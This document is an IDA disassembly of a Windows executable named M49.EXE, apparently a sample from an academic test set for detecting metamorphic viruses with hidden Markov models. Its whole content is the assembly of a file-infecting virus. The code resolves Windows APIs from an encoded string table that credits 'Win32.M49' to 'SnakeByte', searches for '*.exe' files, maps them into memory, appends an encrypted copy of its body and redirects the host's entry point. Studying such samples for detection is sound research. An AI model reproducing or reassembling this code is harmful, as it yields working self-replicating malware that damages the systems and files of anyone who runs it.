

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; º Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TestSet\M49.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00014000 (  81920.)
; Section size in file		: 00014000 (  81920.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

		public start
start:
		nop
		nop
		nop

		nop
		nop
		nop

loc_414685:				; DATA XREF: CODE:0041485Fr
		call	loc_41468E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_41468A	dd 0			; DATA XREF: CODE:0041468Fo
					; CODE:004146A9r ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_41468E:				; CODE XREF: CODE:00414685p
		pop	ebp
		sub	ebp, offset dword_41468A
		cmp	ebp, 0
		jz	short near ptr dword_4146B9
		lea	ecx, dword_4146B9[ebp]
		mov	ebx, 22Dh

loc_4146A5:				; CODE XREF: CODE:004146B7j
		mov	eax, [ecx]
		neg	eax
		sub	eax, ss:dword_41468A[ebp]
		mov	[ecx], eax
		add	ecx, 4
		sub	ebx, 1
		jnz	short loc_4146A5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_4146B9	dd 515900EBh		; CODE XREF: CODE:00414698j
					; DATA XREF: CODE:0041469Ar
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		xor	cx, cx
		rol	eax, 15h

loc_4146C3:				; CODE XREF: CODE:004146D2j
					; CODE:004146D8j
		xor	edx, edx
		dec	ecx
		sub	ecx, 0
		mov	dx, [ecx+3Ch]
		cmp	dx, 0F800h
		jz	short loc_4146C3
		cmp	ecx, [ecx+edx+34h]
		jnz	short loc_4146C3
		mov	ss:dword_414A3B[ebp], ecx
		mov	eax, [ecx+3Ch]
		add	eax, ecx
		mov	ss:dword_414A3F[ebp], eax
		mov	ebx, offset dword_414BE4
		add	ebx, ebp
		push	ebx
		adc	ss:dword_414A2D[ebp], 757027h
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4146FE:				; CODE XREF: sub_414D68+A7p
		sar	ebx, 2
		mov	eax, ss:dword_4148B3[ebp]
		mov	edx, [eax+3Ch]
		add	edx, eax
		add	edx, 3Ch
		mov	ebx, [edx]
		sub	edx, 3Ch
		push	ss:dword_4148DF[ebp]
		pop	eax
		mov	ss:dword_414A09[ebp], ebx
		add	eax, 8E7h
		mov	ss:dword_414A05[ebp], eax
		call	sub_414CF5
		mov	eax, ss:dword_414A05[ebp]
		mov	ss:dword_414A31[ebp], eax
		pusha
		call	sub_414EC5
		shl	ebx, 0Bh
		popa
		push	eax
		pop	ss:dword_4148DF[ebp]
		call	sub_414E55
		jb	loc_41489D
		mov	esi, ss:dword_4148B3[ebp]
		mov	edi, esi
		add	edi, [esi+3Ch]
		add	ss:dword_414A2D[ebp], ebx
		mov	esi, edi
		sub	ebx, ebx
		mov	bx, [esi+6]
		xor	eax, 22D7B6Ah
		sub	ebx, 1
		imul	ebx, 28h
		sub	edx, 4C02417h
		add	edi, ebx
		dec	edi
		shl	eax, 4
		add	edi, 79h
		xor	ebx, ebx
		add	ebx, [esi+74h]
		clc
		rcl	ebx, 3
		add	edi, ebx
		mov	eax, [esi+28h]
		mov	ss:dword_414A25[ebp], eax
		mov	edx, [esi+34h]
		mov	ss:dword_4148AB[ebp], edx
		xor	edx, edx
		add	edx, [edi+10h]
		push	edx
		pop	ecx
		xor	eax, 11A6AA3h
		add	edi, 14h
		add	edx, [edi]
		sub	edi, 14h
		push	edx
		push	ecx
		pop	ebx
		add	edi, 0Ch
		add	ebx, [edi]
		sub	edi, 0Ch
		shl	eax, 1Eh
		mov	[esi+28h], ebx
		mov	ss:dword_4148A7[ebp], ebx
		mov	ebx, [edi+10h]
		push	ebx
		push	dword ptr [esi+3Ch]
		pop	ss:dword_414A09[ebp]
		add	ebx, 8E7h
		mov	ss:dword_414A05[ebp], ebx
		call	sub_414CF5
		mov	ebx, ss:dword_414A05[ebp]
		mov	dword ptr [edi+10h], 0
		add	[edi+10h], ebx
		pop	ebx
		adc	ss:dword_414A2D[ebp], 1357497h
		add	ebx, 4FFh
		add	ebx, 3E8h
		and	eax, eax
		mov	dword ptr [edi+8], 0
		add	[edi+8], ebx
		mov	ebx, [edi+10h]
		add	ebx, [edi+0Ch]
		sub	eax, 3742648h
		mov	[esi+50h], ebx
		or	dword ptr [edi+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 0
		add	dword ptr [esi+4Ch], 4D3439h
		pop	edi
		call	sub_414EDE
		mov	eax, ss:dword_4148BB[ebp]
		adc	ebx, ebx
		mov	ss:dword_41468A[ebp], eax
		sbb	ebx, 6
		lea	esi, loc_414685[ebp]
		add	edi, ss:dword_4148B3[ebp]
		mov	ecx, 34h
		rep movsb
		push	22Dh
		pop	ecx

loc_414878:				; CODE XREF: CODE:00414887j
		lodsd
		add	eax, ss:dword_41468A[ebp]
		neg	eax
		stosd
		xor	edx, eax
		sub	ecx, 1
		jnz	short loc_414878
		push	0
		pop	ebx
		add	ebx, ss:dword_414A1D[ebp]
		sub	ebx, 1
		mov	ss:dword_414A1D[ebp], ebx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_41489D:				; CODE XREF: CODE:00414753j
		stc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_41489F	dd 0			; DATA XREF: sub_414E55+25w
					; sub_414E55+3Br ...
dword_4148A3	dd 0			; DATA XREF: sub_414CB2+15w
					; sub_414CB2+1Fw ...
dword_4148A7	dd 0			; DATA XREF: CODE:004147CEw
dword_4148AB	dd 0			; DATA XREF: CODE:004147A3w
					; CODE:00414D38r ...
dword_4148AF	dd 0			; DATA XREF: CODE:00414F1Dw
dword_4148B3	dd 0			; DATA XREF: CODE:00414701r
					; CODE:00414759r ...
dword_4148B7	dd 0			; DATA XREF: sub_414E21+2Ew
					; sub_414E55+15r ...
dword_4148BB	dd 0			; DATA XREF: CODE:0041484Er
					; sub_414EDE+1r ...
dword_4148BF	dd 8 dup(0)		; DATA XREF: sub_414CB2+7o
					; sub_414CDB+5r
dword_4148DF	dd 0			; DATA XREF: CODE:00414714r
					; CODE:00414748w ...
dword_4148E3	dd 48h dup(0)		; DATA XREF: sub_414C9C+7r
					; sub_414E21+17o
		db 2 dup(0)
dword_414A05	dd 0			; DATA XREF: CODE:00414726w
					; CODE:00414731r ...
dword_414A09	dd 0			; DATA XREF: CODE:0041471Bw
					; CODE:004147DBw ...
dword_414A0D	dd 0			; DATA XREF: CODE:00414B3Dw
					; CODE:00414B69r
dword_414A11	dd 0			; DATA XREF: sub_414CF5+18w
					; sub_414CF5+25r
dword_414A15	dd 2 dup(0)		; DATA XREF: CODE:00414BA5r
					; CODE:00414C3Eo ...
dword_414A1D	dd 0			; DATA XREF: CODE:0041488Cr
					; CODE:00414895w ...
dword_414A21	dd 0			; DATA XREF: CODE:00414BBDr
					; CODE:00414C1Do
dword_414A25	dd 0			; DATA XREF: CODE:0041479Aw
					; CODE:00414D2Cr ...
dword_414A29	dd 0			; DATA XREF: CODE:00414BD5w
					; CODE:00414C76o
dword_414A2D	dd 0			; DATA XREF: CODE:004146F3w
					; CODE:00414764w ...
dword_414A31	dd 0			; DATA XREF: CODE:00414737w
dword_414A35	dd 0			; DATA XREF: CODE:00414B24w
					; CODE:00414B79r
byte_414A39	db 2 dup(0)		; DATA XREF: CODE:00414B1Cw
					; CODE:00414B82w ...
dword_414A3B	dd 0			; DATA XREF: CODE:004146DAw
					; CODE:00414B2Cr ...
dword_414A3F	dd 0			; DATA XREF: CODE:004146E5w
					; CODE:00414BF7o
dword_414A43	dd 0			; DATA XREF: CODE:00414C44o
					; sub_414CDB+13r
dword_414A47	dd 0			; DATA XREF: sub_414EDE+7r
dword_414A4B	dd 0			; DATA XREF: sub_414E55+1Br
dword_414A4F	dd 0			; DATA XREF: sub_414EC5+6r
dword_414A53	dd 0			; DATA XREF: sub_414E55+66r
					; sub_414EC5+12r
dword_414A57	dd 0			; DATA XREF: sub_414E55+41r
dword_414A5B	dd 4 dup(0), 78452E2Ah,	69560065h, 20737572h, 6957203Ah
					; DATA XREF: CODE:00414F5Br
					; sub_414E21+21r ...
		dd 2E32336Eh, 2039344Dh, 68747541h, 3A20726Fh, 616E5320h
		dd 7942656Bh, 0D006574h, 646E6946h, 7478654Eh, 656C6946h
		dd 65470C41h, 63695474h, 756F436Bh, 4312746Eh, 74616572h
		dd 6C694665h, 70614D65h, 676E6970h, 6E550F41h, 5670616Dh
		dd 4F776569h, 6C694666h, 6C430B65h, 4865736Fh, 6C646E61h
		dd 614D0D65h, 65695670h, 46664F77h, 9656C69h, 646E6946h
		dd 736F6C43h, 72430B65h, 65746165h, 656C6946h, 69460E41h
		dd 6946646Eh, 46747372h, 41656C69h, 3DB3360h
		db 9Dh
		dd offset dword_414A15+4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		and	word ptr ss:byte_414A39[ebp], 0

loc_414B24:				; CODE XREF: CODE:00414B94j
		mov	ss:dword_414A35[ebp], ebx
		mov	ecx, [ebx]
		add	ecx, ss:dword_414A3B[ebp]
		push	ecx
		pop	ebx
		mov	esi, ebx
		push	edx
		mov	ss:(dword_414A5B+0Ch)[ebp], esi
		mov	ss:dword_414A0D[ebp], eax
		cld

loc_414B44:				; CODE XREF: CODE:00414B67j
		mov	cl, [esi]
		cmp	cl, [eax]
		jnz	short loc_414B69
		inc	edx
		mov	ss:dword_414A2D[ebp], eax
		sub	edx, 2
		cmp	edx, 0
		jz	short loc_414B96
		adc	ss:dword_414A2D[ebp], 1216397h
		add	esi, 1
		inc	eax
		jmp	short loc_414B44
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414B69:				; CODE XREF: CODE:00414B48j
		mov	eax, ss:dword_414A0D[ebp]
		sbb	ecx, 18h
		mov	esi, ss:(dword_414A5B+0Ch)[ebp]
		pop	edx
		mov	ebx, ss:dword_414A35[ebp]
		add	ebx, 4
		inc	word ptr ss:byte_414A39[ebp]
		cmp	word ptr ss:byte_414A39[ebp], 2006h
		jz	short loc_414BDD
		jmp	short loc_414B24
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414B96:				; CODE XREF: CODE:00414B57j
		add	esp, 4
		push	0
		pop	ebx
		mov	bx, word ptr ss:byte_414A39[ebp]
		shl	ebx, 1
		add	ebx, ss:dword_414A15[ebp]
		mov	ecx, ebx
		add	ss:dword_414A2D[ebp], 269478h
		movzx	ebx, word ptr [ecx]
		shl	ebx, 2
		add	ebx, ss:dword_414A21[ebp]
		mov	ecx, ss:dword_414A3B[ebp]
		add	ecx, [ebx]
		xor	ss:dword_414A2D[ebp], 506496h
		mov	ss:dword_414A29[ebp], ecx
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414BDD:				; CODE XREF: CODE:00414B92j
		pop	edi
		popa
		jmp	loc_414D4A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_414BE4	dd 0FF5724BBh, 0DCC381FFh, 830000A8h, 6A09C3h ;	DATA XREF: CODE:004146EBo
		db 5Eh,	3, 0B5h
		dd offset dword_414A3F
		dd 300E183h, 8D03784Eh
		dd offset dword_414A3B
		dd 1F3155B8h, 1CC18303h, 8341318Bh, 0B50303C1h
		dd offset dword_414A3B
		db 89h,	0B5h
		dd offset dword_414A21
		dd 0C183318Bh
		db 4, 3, 0B5h
		dd offset dword_414A3B
		db 89h,	0B5h
		dd offset dword_414A15+4
		dd 318BD30Bh
		db 3, 0B5h
		dd offset dword_414A3B
		db 89h,	0B5h
		dd offset dword_414A15
		db 8Dh,	0BDh
		dd offset dword_414A43
		db 8Dh,	85h
		dd offset dword_414A5B+3Bh
		dd 0A2B8E181h, 2BA02ADh, 81FFFF13h, 0ECFEC2h, 83108A00h
		dd 0AAE8FFE8h, 50FFFFFEh, 58241401h, 0B2C2C981h, 0B5FF00E1h
		dd offset dword_414A29
		dd 7C759h, 1000000h, 0CC39800Fh, 0BE840Fh, 0C7830000h
		dd 1EB8304h, 9D8DC075h
		dd offset loc_414EF9
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		push	ebx
		retn

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414C9C	proc near		; CODE XREF: sub_414CB2p sub_414CDBp
		pusha
		push	114h
		pop	ebx
		lea	edx, (dword_4148E3+8)[ebp]

loc_414CA9:				; CODE XREF: sub_414C9C+12j
		mov	byte ptr [edx],	0
		inc	edx
		dec	ebx
		jnz	short loc_414CA9
		popa
		retn
sub_414C9C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414CB2	proc near		; CODE XREF: CODE:00414F32p
		call	sub_414C9C
		mov	edi, ebp
		add	edi, offset dword_4148BF
		push	edi
		push	edx
		call	ss:(dword_414A5B+8)[ebp]
		mov	ss:dword_4148A3[ebp], 0
		add	ss:dword_4148A3[ebp], eax
		retn
sub_414CB2	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		shr	ecx, 1Eh

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414CDB	proc near		; CODE XREF: CODE:00414F4Bp
		call	sub_414C9C
		lea	ecx, dword_4148BF[ebp]
		push	ecx
		mov	eax, ss:dword_4148A3[ebp]
		push	eax
		call	ss:dword_414A43[ebp]
		retn
sub_414CDB	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414CF5	proc near		; CODE XREF: CODE:0041472Cp
					; CODE:004147EDp
		pusha
		mov	ebx, ss:dword_414A09[ebp]
		mov	edx, 0CF0Ch
		sub	edx, 0CF0Ch
		mov	eax, ss:dword_414A05[ebp]
		mov	ss:dword_414A11[ebp], eax
		div	ebx
		sub	ebx, edx
		shr	ecx, 12h
		mov	eax, ss:dword_414A11[ebp]
		add	eax, ebx
		mov	ss:dword_414A05[ebp], eax
		popa
		retn
sub_414CF5	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		sub	ecx, ecx
		mov	ecx, ss:dword_414A25[ebp]
		mov	dword ptr ss:(loc_414D53+2)[ebp], ecx
		mov	ecx, ss:dword_4148AB[ebp]
		mov	dword ptr ss:(loc_414D4E+1)[ebp], ecx
		mov	ss:dword_414A2D[ebp], eax

loc_414D4A:				; CODE XREF: CODE:00414BDFj
					; CODE:00414F61j
		or	ebp, ebp
		jz	short loc_414D5B

loc_414D4E:				; DATA XREF: CODE:00414D3Ew
					; CODE:00414F0Bw ...
		mov	edx, 0

loc_414D53:				; DATA XREF: CODE:00414D32w
					; CODE:00414EFFw
		add	edx, 0
		push	edx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414D5B:				; CODE XREF: CODE:00414D4Cj
		xor	ecx, ecx
		push	ecx
		call	ExitProcess
		xor	eax, 3F238C3h

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414D68	proc near		; CODE XREF: CODE:00414F3Dp
		lea	edx, dword_4148DF[ebp]
		cmp	dword ptr [edx], 74h
		jbe	locret_414E1D
		lea	ecx, (dword_4148BF+1Ch)[ebp]
		cmp	dword ptr [ecx], 0
		jnz	locret_414E1D
		call	sub_414E21
		jb	locret_414E1D
		push	ss:dword_4148B3[ebp]
		pop	edi
		cmp	word ptr [edi],	5A4Dh
		jz	short loc_414DB4
		adc	eax, eax
		mov	ecx, 0
		add	ecx, 3922h
		cmp	ecx, 3922h
		jz	short loc_414E18

loc_414DB4:				; CODE XREF: sub_414D68+35j
		cmp	word ptr [edi+3Ch], 0
		jnz	short loc_414DBD
		jmp	short loc_414E18
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414DBD:				; CODE XREF: sub_414D68+51j
		mov	eax, 0
		add	eax, [edi+3Ch]
		cmp	eax, ss:dword_4148DF[ebp]
		ja	short loc_414E18
		add	eax, edi
		movzx	edx, word ptr [eax]
		sar	ebx, 1Bh
		cmp	edx, 4550h
		jz	short loc_414DE2
		push	0
		pop	ebx
		jz	short loc_414E18

loc_414DE2:				; CODE XREF: sub_414D68+73j
		cmp	dword ptr [eax+4Ch], 4D3439h
		jz	short loc_414E18
		mov	bx, [eax+16h]
		and	bx, 0F000h
		cmp	bx, 2000h
		jz	short loc_414E18
		mov	cx, [eax+16h]
		and	cx, 2
		cmp	cx, 2
		jnz	short loc_414E18
		and	ebx, 1E8DA4Dh
		call	loc_4146FE
		jnb	short loc_414E18
		jmp	short locret_414E1D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414E18:				; CODE XREF: sub_414D68+4Aj
					; sub_414D68+53j ...
		call	loc_414EB0

locret_414E1D:				; CODE XREF: sub_414D68+9j
					; sub_414D68+18j ...
		retn
sub_414D68	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		rcl	edx, 6

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414E21	proc near		; CODE XREF: sub_414D68+1Ep
		push	0
		and	eax, edx
		push	0
		push	3
		push	0
		push	1
		ror	edx, 2
		mov	eax, 0C0000000h
		push	eax
		mov	edx, ebp
		add	edx, (offset dword_4148E3+8)
		rol	eax, 0Ah
		push	edx
		call	ss:(dword_414A5B+4)[ebp]
		inc	eax
		jz	short loc_414EC3
		sub	eax, 1
		push	eax
		pop	ss:dword_4148B7[ebp]
sub_414E21	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414E55	proc near		; CODE XREF: CODE:0041474Ep
		mov	ebx, ss:dword_4148DF[ebp]
		shl	ecx, 1Ch
		push	ebx
		add	edx, ebx
		push	0
		push	ebx
		push	0
		push	4
		push	0
		push	ss:dword_4148B7[ebp]
		call	ss:dword_414A4B[ebp]
		push	eax
		shr	edx, 14h
		pop	ss:dword_41489F[ebp]
		pop	ebx
		or	eax, eax
		jz	short loc_414EB5
		push	ebx
		push	0
		push	0
		mov	edx, 2
		push	edx
		push	ss:dword_41489F[ebp]
		call	ss:dword_414A57[ebp]
		test	eax, eax
		jz	short loc_414EB0
		mov	edx, eax
		rol	ecx, 13h
		mov	ss:dword_4148B3[ebp], edx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		ror	ecx, 4

loc_414EB0:				; CODE XREF: sub_414D68+B0p
					; sub_414E55+49j
		call	sub_414EC5

loc_414EB5:				; CODE XREF: sub_414E55+2Ej
		push	ss:dword_4148B7[ebp]
		call	ss:dword_414A53[ebp]
		or	ecx, ebx

loc_414EC3:				; CODE XREF: sub_414E21+28j
		stc
		retn
sub_414E55	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414EC5	proc near		; CODE XREF: CODE:0041473Ep
					; sub_414E55+5Bp
		push	ss:dword_4148B3[ebp]
		call	ss:dword_414A4F[ebp]
		push	ss:dword_41489F[ebp]
		call	ss:dword_414A53[ebp]
		retn
sub_414EC5	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_414EDE	proc near		; CODE XREF: CODE:00414849p
		pusha
		add	edx, ss:dword_4148BB[ebp]
		call	ss:dword_414A47[ebp]
		sub	edx, eax
		ror	edx, 19h
		push	edx
		pop	ss:dword_4148BB[ebp]
		popa
		retn
sub_414EDE	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_414EF9:				; DATA XREF: CODE:00414C96o
		mov	eax, ss:dword_414A25[ebp]
		mov	dword ptr ss:(loc_414D53+2)[ebp], eax
		mov	esi, ss:dword_4148AB[ebp]
		mov	dword ptr ss:(loc_414D4E+1)[ebp], esi
		mov	esi, ss:dword_4148AB[ebp]
		mov	dword ptr ss:(loc_414D4E+1)[ebp], esi
		mov	ss:dword_4148AF[ebp], esi
		push	14h
		pop	ss:dword_414A1D[ebp]
		mov	edx, (offset dword_414A5B+10h)
		add	edx, ebp
		call	sub_414CB2
		shl	ecx, 16h
		inc	eax
		jz	short loc_414F55

loc_414F3D:				; CODE XREF: CODE:00414F53j
		call	sub_414D68
		cmp	ss:dword_414A1D[ebp], 0
		jz	short loc_414F55
		call	sub_414CDB
		cmp	eax, 0
		jnz	short loc_414F3D

loc_414F55:				; CODE XREF: CODE:00414F3Bj
					; CODE:00414F49j
		push	ss:dword_4148A3[ebp]
		call	ss:dword_414A5B[ebp]
		jmp	loc_414D4A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		add	ss:dword_414A2D[ebp], eax
; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		align 100h
CODE		ends

; Section 2. (virtual address 00015000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00014600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
